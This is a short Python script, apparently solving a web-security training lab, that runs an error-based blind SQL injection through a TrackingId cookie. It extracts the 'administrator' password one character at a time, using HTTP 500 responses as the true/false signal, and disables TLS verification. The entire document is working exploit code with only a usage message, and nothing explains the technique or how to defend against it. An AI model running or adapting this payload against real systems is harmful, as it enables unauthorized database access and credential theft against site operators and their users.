import requests
import sys
import urllib3 
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

FAIL = -1

def get_password(url):
    password = ""
    for position in range(1,21):
        for code in range(32,126):
            sqli_payload = (
                "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END "
                "FROM users where username='administrator' and "
                "ascii(substr(password,%s,1))='%s') || '" 
                ) % (position, code)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {
                'TrackingId': 'sgytYcltfd2AqeAe' + sqli_payload_encoded,
                'session': 'QdX8GdRw2yL3hd5dVze34tQ0SP77GWI8'}
            response = requests.get(
                url, 
                cookies=cookies,
                verify=False,
                proxies=proxies)
            if response.status_code == 500:
                password += chr(code)
                sys.stdout.write('\r' + password)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password + chr(code))
                sys.stdout.flush()

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        print("[+] Retrieving administrator password...")
        get_password(url)
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("[-] An exception occured %s" % exception)
        print("[-] The SQLi attack was not successful.")
        sys.exit(FAIL)   